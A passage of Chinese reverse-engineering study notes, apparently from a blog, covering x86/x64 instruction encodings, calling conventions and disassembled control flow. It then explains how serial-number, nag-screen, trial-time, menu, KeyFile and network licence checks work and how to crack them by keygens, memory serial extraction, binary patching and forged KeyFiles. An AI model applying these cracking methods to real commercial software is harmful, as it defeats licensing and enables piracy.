&lt;tr&gt;
&lt;td&gt;inc eax + dec eax&lt;/td&gt;
&lt;td&gt;40 48&lt;/td&gt;
&lt;td&gt;2&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;mov edi, edi&lt;/td&gt;
&lt;td&gt;8B FF&lt;/td&gt;
&lt;td&gt;2&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;jmp xx&lt;/td&gt;
&lt;td&gt;EB 00&lt;/td&gt;
&lt;td&gt;2&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;p&gt;用nop就行&lt;/p&gt;
&lt;p&gt;寄存器清零：&lt;/p&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;指令&lt;/th&gt;
&lt;th&gt;机器码&lt;/th&gt;
&lt;th&gt;指令字节长度&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;mov eax, 00000000h&lt;/td&gt;
&lt;td&gt;B8 00 00 00 00&lt;/td&gt;
&lt;td&gt;5&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;push 0 + pop eax&lt;/td&gt;
&lt;td&gt;6A 00 + 58&lt;/td&gt;
&lt;td&gt;3&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;sub eax, eax&lt;/td&gt;
&lt;td&gt;2B C0&lt;/td&gt;
&lt;td&gt;2&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;xor eax, eax&lt;/td&gt;
&lt;td&gt;33 C0&lt;/td&gt;
&lt;td&gt;2&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;p&gt;测试寄存器是否为0：&lt;/p&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;指令&lt;/th&gt;
&lt;th&gt;机器码&lt;/th&gt;
&lt;th&gt;指令字节长度&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;cmp eax, 00000000h&lt;/td&gt;
&lt;td&gt;83 F8 00&lt;/td&gt;
&lt;td&gt;3&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;or eax, eax / test eax, eax&lt;/td&gt;
&lt;td&gt;0B C0 / 85 C0&lt;/td&gt;
&lt;td&gt;2&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;p&gt;后接 &lt;code&gt;je label&lt;/code&gt; 字节码为 &lt;code&gt;74 xx&lt;/code&gt; 或 &lt;code&gt;0F 84 xxxxxxxx&lt;/code&gt;，长度为2或6，取决于近跳转还是远跳转&lt;/p&gt;
&lt;p&gt;寄存器置 &lt;code&gt;0FFFFFFFFh&lt;/code&gt;&lt;/p&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;指令&lt;/th&gt;
&lt;th&gt;机器码&lt;/th&gt;
&lt;th&gt;指令字节长度&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;mov eax, 0FFFFFFFFh&lt;/td&gt;
&lt;td&gt;B8 FF FF FF FF&lt;/td&gt;
&lt;td&gt;5&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;（清零后）dec eax&lt;/td&gt;
&lt;td&gt;48&lt;/td&gt;
&lt;td&gt;1&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;std + sbb eax, eax&lt;/td&gt;
&lt;td&gt;F9 + 2B C0&lt;/td&gt;
&lt;td&gt;3&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;p&gt;转移指令&lt;/p&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;指令&lt;/th&gt;
&lt;th&gt;机器码&lt;/th&gt;
&lt;th&gt;指令字节长度&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;jmp label&lt;/td&gt;
&lt;td&gt;EB xx / E9 xxxxxxxx&lt;/td&gt;
&lt;td&gt;2 / 6&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;push label + ret&lt;/td&gt;
&lt;td&gt;68 xxxxxxxx + C3&lt;/td&gt;
&lt;td&gt;6&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;h3 id=&#34;64位&#34;&gt;64位&lt;/h3&gt;
&lt;p&gt;与32位有很多重叠&lt;/p&gt;
&lt;h4 id=&#34;寄存器-1&#34;&gt;寄存器&lt;/h4&gt;
&lt;p&gt;64位通用寄存器 R 开头&lt;/p&gt;
&lt;p&gt;8个128位 XMM 寄存器，通常用来优化（SIMD指令）&lt;/p&gt;
&lt;p&gt;此外， &lt;code&gt;AX&lt;/code&gt; 低16位，&lt;code&gt;AL&lt;/code&gt; 低8位， &lt;code&gt;AH&lt;/code&gt; 第 $8\sim 15$ 位&lt;/p&gt;
&lt;p&gt;&lt;code&gt;R8&lt;/code&gt; 则有 &lt;code&gt;R8D&lt;/code&gt; 低32位，&lt;code&gt;R8W&lt;/code&gt; 低16位，&lt;code&gt;R8B&lt;/code&gt; 低8位&lt;/p&gt;
&lt;h4 id=&#34;函数&#34;&gt;函数&lt;/h4&gt;
&lt;h5 id=&#34;栈-1&#34;&gt;栈&lt;/h5&gt;
&lt;p&gt;x64中有如下区别&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;一个栈空间8字节（64位）&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;汇编指令对栈顶需要对齐16（被16整除）&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h5 id=&#34;根据start寻找main&#34;&gt;根据start寻找main&lt;/h5&gt;
&lt;p&gt;start函数结束前会有如下指令&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code class=&#34;language-assembly&#34; data-lang=&#34;assembly&#34;&gt;jmp __tmainCRTStartup
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;进入该函数后可以看到 &lt;code&gt;main&lt;/code&gt; 函数&lt;/p&gt;
&lt;p&gt;如果符号表被去除，可根据前后特征进行定位&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;在调用完成main后，通常会调用exit来退出进程，所以exit前的一个call就是main函数（也可能在该函数内部的call中）。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h5 id=&#34;调用约定&#34;&gt;调用约定&lt;/h5&gt;
&lt;p&gt;使用寄存器快速调用约定&lt;/p&gt;
&lt;p&gt;前几个参数使用的寄存器是固定的，后续的参数从右往左栈，非1, 2, 4, 8字节大小的参数必须用引用（地址）传参&lt;/p&gt;
&lt;p&gt;传递顺序为 &lt;code&gt;RCX&lt;/code&gt;， &lt;code&gt;RDX&lt;/code&gt;， &lt;code&gt;R8&lt;/code&gt;， &lt;code&gt;R9&lt;/code&gt;，所有浮点参数由XMM传参，顺序依次为 &lt;code&gt;XMM0&lt;/code&gt; ~ &lt;code&gt;XMM3&lt;/code&gt;&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;为了使得寄存器仍然能够使用，会预留栈空间，将寄存器的值存入栈空间中，该空间由调用者申请并平衡&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h5 id=&#34;函数返回值&#34;&gt;函数返回值&lt;/h5&gt;
&lt;p&gt;使用 &lt;code&gt;RAX&lt;/code&gt; 返回参数，返回值过大可以使用栈空间作为参数间接访问&lt;/p&gt;
&lt;h4 id=&#34;数据结构-1&#34;&gt;数据结构&lt;/h4&gt;
&lt;h5 id=&#34;局部变量-1&#34;&gt;局部变量&lt;/h5&gt;
&lt;p&gt;使用栈区进行存放&lt;/p&gt;
&lt;p&gt;Release版会更多地使用寄存器&lt;/p&gt;
&lt;h5 id=&#34;全局变量-1&#34;&gt;全局变量&lt;/h5&gt;
&lt;p&gt;地址通常在编译期固定&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code class=&#34;language-assembly&#34; data-lang=&#34;assembly&#34;&gt;mov eax, cs:140009150h
&lt;/code&gt;&lt;/pre&gt;&lt;h5 id=&#34;数组-1&#34;&gt;数组&lt;/h5&gt;
&lt;p&gt;$地址=首地址+类型大小\times 下标$&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;IDA中使用Y快捷键来修改数据类型，可以反编译成下标模式，更好看一些&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;汇编通常为 &lt;code&gt;[地址+寄存器*n]&lt;/code&gt;（或者循环中每次循环 &lt;code&gt;地址+=n&lt;/code&gt;？）&lt;/p&gt;
&lt;h4 id=&#34;控制语句-1&#34;&gt;控制语句&lt;/h4&gt;
&lt;p&gt;通常虚线箭头表示有条件跳转，实线箭头表示无条件跳转&lt;/p&gt;
&lt;p&gt;if 语句：jxx跳转，且目的地址后没有jxx（说明不是循环）&lt;/p&gt;
&lt;p&gt;if else语句：jxx跳转，且目的地之前有一个jmp实跳转，目的地址后无跳转&lt;/p&gt;
&lt;p&gt;if elif else语句：多个jxx跳转，每个Block以jmp结尾，最后一个Block不含跳转&lt;/p&gt;
&lt;p&gt;switch case语句：分支数 $\geqslant 6$ 使用case表，$&amp;lt;6$ 使用else if&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;无法使用case表的情况下，为减少if的判断次数，可能使用二叉平衡树来减少if判断次数&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h4 id=&#34;循环语句-1&#34;&gt;循环语句&lt;/h4&gt;
&lt;h5 id=&#34;do-while&#34;&gt;do while&lt;/h5&gt;
&lt;p&gt;先执行，后判断&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code class=&#34;language-assembly&#34; data-lang=&#34;assembly&#34;&gt;do_while_start:{	; 代码}cmp a, bjxx do_while_start
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;通常有一个向上跳转&lt;/p&gt;
&lt;h5 id=&#34;while循环&#34;&gt;while循环&lt;/h5&gt;
&lt;p&gt;先判断，后执行&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code class=&#34;language-assembly&#34; data-lang=&#34;assembly&#34;&gt;while_start:cmp a, bjxx while_end{	; 代码}jmp while_startwhile_end:; 后续代码
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;通常为一个向下的条件跳转，该目的地之前有一个向上的实跳转，跳转到向下跳转前&lt;/p&gt;
&lt;h5 id=&#34;for-循环&#34;&gt;for 循环&lt;/h5&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code class=&#34;language-assembly&#34; data-lang=&#34;assembly&#34;&gt;jmp for_iffor_step:  步长for_if:  循环条件jxx for_endfor 代码jmp for_stepfor_end:
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;很常见的代码，比while循环多一个向下跳转&lt;/p&gt;
&lt;h4 id=&#34;数学运算符&#34;&gt;数学运算符&lt;/h4&gt;
&lt;h5 id=&#34;加减法-1&#34;&gt;加减法&lt;/h5&gt;
&lt;p&gt;add和sub指令，可用lea指令进行优化&lt;/p&gt;
&lt;p&gt;此外还有&lt;strong&gt;常量折叠&lt;/strong&gt;的优化方法，即编译时提前完成常量间的计算，节省运行消耗的时间&lt;/p&gt;
&lt;h5 id=&#34;乘法-1&#34;&gt;乘法&lt;/h5&gt;
&lt;p&gt;imul为有符号乘法，mul为无符号乘法&lt;/p&gt;
&lt;p&gt;通常使用lea比例因子寻址优化&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code class=&#34;language-assembly&#34; data-lang=&#34;assembly&#34;&gt;lea edx, ds:0[rcx*4] ; *4imul edx, 7          ; *7lea edx, [rbc+rbc*8] ; *9
&lt;/code&gt;&lt;/pre&gt;&lt;h5 id=&#34;除法-1&#34;&gt;除法&lt;/h5&gt;
&lt;h6 id=&#34;有符号&#34;&gt;有符号&lt;/h6&gt;
&lt;p&gt;除数为 $2^n$ 时，使用位移进行优化&lt;/p&gt;
&lt;p&gt;除数为 $-2^n$ 时，使用位移，同时增加求补（x为负数时，计算 $-((x+(2^n-1))\gg n)$ ）&lt;/p&gt;
&lt;h5 id=&#34;取模&#34;&gt;取模&lt;/h5&gt;
&lt;h2 id=&#34;软件保护技术&#34;&gt;软件保护技术&lt;/h2&gt;
&lt;h3 id=&#34;序列号&#34;&gt;序列号&lt;/h3&gt;
&lt;p&gt;序列号（注册码）的方式是目前最常见的一种保护&lt;/p&gt;
&lt;p&gt;过程通常为：用户提交个人信息，公司计算得到序列号并返回给用户，用户通过序列号进行注册。软件从磁盘文件或注册表中获取注册信息&lt;/p&gt;
&lt;h4 id=&#34;保护机制&#34;&gt;保护机制&lt;/h4&gt;
&lt;h5 id=&#34;本地计算用户信息并与序列号比较&#34;&gt;本地计算用户信息并与序列号比较&lt;/h5&gt;
&lt;p&gt;即：$序列号=F(用户名)$&lt;/p&gt;
&lt;p&gt;对于这种方式，可以直接使用调试的手段，在内存中直接找到计算后的序列号，同时，将F函数复制出即可生成注册机&lt;/p&gt;
&lt;h5 id=&#34;通过注册码求逆并与用户信息比较&#34;&gt;通过注册码求逆并与用户信息比较&lt;/h5&gt;
&lt;p&gt;即：用公式 $序列号=F(用户名)$ 生成，用公式 $用户名=F^{-1}(序列号)$ 验证&lt;/p&gt;
&lt;p&gt;破解方法有&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;通过 $F^{-1}$ 求出 $F$&lt;/li&gt;
&lt;li&gt;给定用户名，穷举序列号&lt;/li&gt;
&lt;li&gt;给定序列号，用 $F^{-1}$ 计算出用户名（通常包含不可见字符）&lt;/li&gt;
&lt;/ul&gt;
&lt;h5 id=&#34;对等函数检查&#34;&gt;对等函数检查&lt;/h5&gt;
&lt;p&gt;即：$F_1(用户名)=F_2(序列号)$&lt;/p&gt;
&lt;p&gt;通常 $F_2$ 可逆，借鉴上两种破解思路即可&lt;/p&gt;
&lt;h5 id=&#34;二元函数&#34;&gt;二元函数&lt;/h5&gt;
&lt;p&gt;即：$特定值=F(用户名，序列号)$&lt;/p&gt;
&lt;p&gt;缺陷在于可能缺少用户名与序列号的一一对应关系，开发者不易写出注册机&lt;/p&gt;
&lt;h4 id=&#34;攻击方法&#34;&gt;攻击方法&lt;/h4&gt;
&lt;p&gt;法一：通过跟踪输入，找到判断逻辑&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;软件通常调用api将用户输入复制到缓冲区，常用api有：&lt;code&gt;GetWindowsTextA(W)&lt;/code&gt;，&lt;code&gt;GetDiaItemTextA(W)&lt;/code&gt;，&lt;code&gt;GetDlgItemInt&lt;/code&gt;，&lt;code&gt;hmemcpy&lt;/code&gt;，或者查找输出函数（对话框或标准输出等）&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;法二：跟踪程序启动时对注册码的判断过程&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;注册表中的序列号会调用 &lt;code&gt;RegQueryValueExA(W)&lt;/code&gt;，INI文件中 &lt;code&gt;GetPrivateProfileStringA(W)&lt;/code&gt;等等&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h5 id=&#34;根据数据约束性&#34;&gt;根据数据约束性&lt;/h5&gt;
&lt;p&gt;对于采用明文比较的程序，正确注册码通常在输入注册码的前后 &lt;code&gt;90h&lt;/code&gt; 字节的地方&lt;/p&gt;
&lt;h5 id=&#34;hmemcpy&#34;&gt;hmemcpy&lt;/h5&gt;
&lt;p&gt;这个函数是 &lt;code&gt;Windows 9x&lt;/code&gt; 系统的内部函数，是万能断点&lt;/p&gt;
&lt;p&gt;现在同样可以使用系统的API下断点&lt;/p&gt;
&lt;h5 id=&#34;消息断点&#34;&gt;消息断点&lt;/h5&gt;
&lt;p&gt;按下和释放鼠标时，会发送 &lt;code&gt;WM_LBUTTONDOWN (0201h)&lt;/code&gt; 和 &lt;code&gt;WM_LBUTTONUP (0202h)&lt;/code&gt; 消息&lt;/p&gt;
&lt;p&gt;可以利用消息断点断在按钮的事件代码处&lt;/p&gt;
&lt;h5 id=&#34;人机交互信息&#34;&gt;人机交互信息&lt;/h5&gt;
&lt;p&gt;软件大多数采用了人机对话的方式进行，因此可以直接通过搜索字符串和交叉引用找到关键函数&lt;/p&gt;
&lt;p&gt;应该是目前最常用的方法了&lt;/p&gt;
&lt;h4 id=&#34;字符串比较&#34;&gt;字符串比较&lt;/h4&gt;
&lt;ol&gt;
&lt;li&gt;寄存器直接比较&lt;/li&gt;
&lt;li&gt;函数比较&lt;/li&gt;
&lt;li&gt;串比较&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;串比较有些少见，记录一下：&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code class=&#34;language-assembly&#34; data-lang=&#34;assembly&#34;&gt;lea edi []
lea esi []
repz cmpsd
jz (jnz)
&lt;/code&gt;&lt;/pre&gt;&lt;h4 id=&#34;制作注册机&#34;&gt;制作注册机&lt;/h4&gt;
&lt;h5 id=&#34;明码泄露的攻击&#34;&gt;明码泄露的攻击&lt;/h5&gt;
&lt;p&gt;序列号在内存中曾以明码出现过即可&lt;/p&gt;
&lt;p&gt;可以使用keymake编写内存注册机，或利用 &lt;code&gt;Int 3&lt;/code&gt; 等 &lt;code&gt;Debug API&lt;/code&gt; 手写内存注册机&lt;/p&gt;
&lt;h5 id=&#34;无明码&#34;&gt;无明码&lt;/h5&gt;
&lt;p&gt;进行加密算法的逆向解密&lt;/p&gt;
&lt;p&gt;或者直接将汇编嵌入注册机中&lt;/p&gt;
&lt;h3 id=&#34;警告窗口&#34;&gt;警告窗口&lt;/h3&gt;
&lt;p&gt;软件不时提醒用户购买正式版本&lt;/p&gt;
&lt;p&gt;可以通过设置窗口为不可见来去除，或者在窗口的创建函数处将其跳过&lt;/p&gt;
&lt;p&gt;利用 &lt;code&gt;Resource Hacker&lt;/code&gt; 软件可以找到窗口的 id，然后再汇编中搜索即可找到窗口的程序&lt;/p&gt;
&lt;p&gt;程序中，是否注册的 &lt;code&gt;flag&lt;/code&gt; 标记可能是全局变量，找到这个变量并 patch 程序使其为 1 即可&lt;/p&gt;
&lt;h3 id=&#34;时间限制&#34;&gt;时间限制&lt;/h3&gt;
&lt;p&gt;限制单次运行时长，或者限制软件的使用时间&lt;/p&gt;
&lt;h4 id=&#34;计时器&#34;&gt;计时器&lt;/h4&gt;
&lt;h5 id=&#34;settimer-函数&#34;&gt;setTimer() 函数&lt;/h5&gt;
&lt;p&gt;程序运行时会申请一个计时器，并指定间隔，并获得一个处理计时器超时的回调函数&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-c&#34; data-lang=&#34;c&#34;&gt;UINT &lt;span style=&#34;color:#a6e22e&#34;&gt;SetTimer&lt;/span&gt;(
    HWND hWnd,             &lt;span style=&#34;color:#75715e&#34;&gt;// 窗口句柄，计时器到时后，将向这个窗口发送WM_TIMER消息
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;    UINT nIDEvent,         &lt;span style=&#34;color:#75715e&#34;&gt;// 计时器标识
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;    UINT uElapse,          &lt;span style=&#34;color:#75715e&#34;&gt;// 指定计时器时间间隔（单位为毫秒）
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;    TIMERPROC lpTimerFunc  &lt;span style=&#34;color:#75715e&#34;&gt;// 回调函数，超时后将调用
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;);
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h5 id=&#34;高精度计时器&#34;&gt;高精度计时器&lt;/h5&gt;
&lt;p&gt;通过调用 &lt;code&gt;timeSecEvent()&lt;/code&gt; 函数启动&lt;/p&gt;
&lt;h5 id=&#34;gettickcount-函数及-timegettime-函数&#34;&gt;GetTickCount() 函数及 timeGetTime() 函数&lt;/h5&gt;
&lt;p&gt;该函数返回系统自成功启动以来所经过的时间，将两次返回值相减，即可得到当前运行时间&lt;/p&gt;
&lt;p&gt;这种方法也可以使用 &lt;code&gt;time()&lt;/code&gt; 等函数&lt;/p&gt;
&lt;h4 id=&#34;时间限制-1&#34;&gt;时间限制&lt;/h4&gt;
&lt;p&gt;软件通常将第一次运行时的系统时间，存放在注册表或文件或某扇区中，每次运行时获取该时间，并与当前时间进行比较&lt;/p&gt;
&lt;p&gt;为了避免用户修改系统时间，软件会在保存安装时间（并存放于多个地方）之外，再保存最近一次运行的时间，每次运行时用当前时间替换&lt;/p&gt;
&lt;h4 id=&#34;拆解时间限制&#34;&gt;拆解时间限制&lt;/h4&gt;
&lt;ol&gt;
&lt;li&gt;直接跳过 &lt;code&gt;SetTimer()&lt;/code&gt; 函数&lt;/li&gt;
&lt;li&gt;利用 &lt;code&gt;WM_TIMER&lt;/code&gt; 消息，查找到时间比较的位置，对二进制文件进行patch（去掉退出跳转等等）&lt;/li&gt;
&lt;/ol&gt;
&lt;blockquote&gt;
&lt;p&gt;动态分析时，可以配合变速齿轮使用，这样就可以很快到达软件的限制时间，进行调试&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h3 id=&#34;菜单功能限制&#34;&gt;菜单功能限制&lt;/h3&gt;
&lt;p&gt;当注册版和正式版文件相同，只是部分功能被限制无法使用时，可以恢复正式版的功能&lt;/p&gt;
&lt;h4 id=&#34;相关函数&#34;&gt;相关函数&lt;/h4&gt;
&lt;h5 id=&#34;enablemenuitem&#34;&gt;EnableMenuItem()&lt;/h5&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-c&#34; data-lang=&#34;c&#34;&gt;BOOL EnableMenuItem(
    HMENU hMenu,        &lt;span style=&#34;color:#75715e&#34;&gt;// 菜单句柄
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;    UINT uIDEnableItem, &lt;span style=&#34;color:#75715e&#34;&gt;// 欲允许或禁止的一个菜单条目的标识符
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;    UINT uEnable,       &lt;span style=&#34;color:#75715e&#34;&gt;// 控制标志，包括允许、灰化、禁止等
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;)
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h5 id=&#34;enablewindow&#34;&gt;EnableWindow()&lt;/h5&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-c&#34; data-lang=&#34;c&#34;&gt;BOOL EnableWindow(
    HWND hWnd,    &lt;span style=&#34;color:#75715e&#34;&gt;// 窗口句柄
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;    BOOL bEnable  &lt;span style=&#34;color:#75715e&#34;&gt;// True为允许，False为禁止
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;)
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h4 id=&#34;拆解菜单限制保护&#34;&gt;拆解菜单限制保护&lt;/h4&gt;
&lt;p&gt;找到关键函数，把函数的参数patch一下即可&lt;/p&gt;
&lt;h3 id=&#34;keyfile保护&#34;&gt;KeyFile保护&lt;/h3&gt;
&lt;p&gt;KeyFile通常是一个小文件，可能是可见字符，也可能是二进制文件，由软件开发者定义&lt;/p&gt;
&lt;p&gt;软件启动后，会从KeyFile文件中读取数据，根据处理结果判断是否正确注册&lt;/p&gt;
&lt;h4 id=&#34;相关api&#34;&gt;相关API&lt;/h4&gt;
&lt;p&gt;与文件操作有关的API都可以下断点&lt;/p&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;API&lt;/th&gt;
&lt;th&gt;作用&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;FindFirstFileA&lt;/td&gt;
&lt;td&gt;确定注册文件是否存在&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;CreateFileA, _lopen&lt;/td&gt;
&lt;td&gt;确定文件是否存在，打开文件以获得句柄&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;GetFileSize, GetFileSizeEx&lt;/td&gt;
&lt;td&gt;获得文件的大小&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;GetFileAttributesA, GetFileAttributesExA&lt;/td&gt;
&lt;td&gt;获得文件的属性&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;SetFilePointer, SetFilePointerEx&lt;/td&gt;
&lt;td&gt;移动文件指针&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;ReadFile&lt;/td&gt;
&lt;td&gt;读取文件内容&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;h4 id=&#34;拆解保护&#34;&gt;拆解保护&lt;/h4&gt;
&lt;ol&gt;
&lt;li&gt;利用文件监视软件找到KeyFile文件名&lt;/li&gt;
&lt;li&gt;利用十六进制编辑器伪造KeyFile&lt;/li&gt;
&lt;li&gt;动态调试，跟踪文件内容&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;具体的破解方法与输入序列号类似&lt;/p&gt;
&lt;h3 id=&#34;网络验证&#34;&gt;网络验证&lt;/h3&gt;
&lt;p&gt;软件必须从服务器中取得一些关键数据才能正确运行&lt;/p&gt;
&lt;p&gt;破解的思路是拦截服务器的数据包，并分析程序对该数据包的处理&lt;/p&gt;
&lt;h4 id=&#34;相关api-1&#34;&gt;相关API&lt;/h4&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-c&#34; data-lang=&#34;c&#34;&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;send&lt;/span&gt;(
    SOCKET s,                 &lt;span style=&#34;color:#75715e&#34;&gt;// 套接字描述符
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;const&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;char&lt;/span&gt; FAR &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;buf,      &lt;span style=&#34;color:#75715e&#34;&gt;// 缓冲区
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; len,                  &lt;span style=&#34;color:#75715e&#34;&gt;// 发送数据的字节数
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; flags                 &lt;span style=&#34;color:#75715e&#34;&gt;// 附加标志，一般为0
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;);
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-c&#34; data-lang=&#34;c&#34;&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;recv&lt;/span&gt;(
    SOCKET s,             &lt;span style=&#34;color:#75715e&#34;&gt;// 套接字描述符
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;char&lt;/span&gt; FAR &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;buf,        &lt;span style=&#34;color:#75715e&#34;&gt;// 缓冲区
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; len,              &lt;span style=&#34;color:#75715e&#34;&gt;// 缓冲区buf的长度
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; flags             &lt;span style=&#34;color:#75715e&#34;&gt;// 附加标志，一般为0
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;);
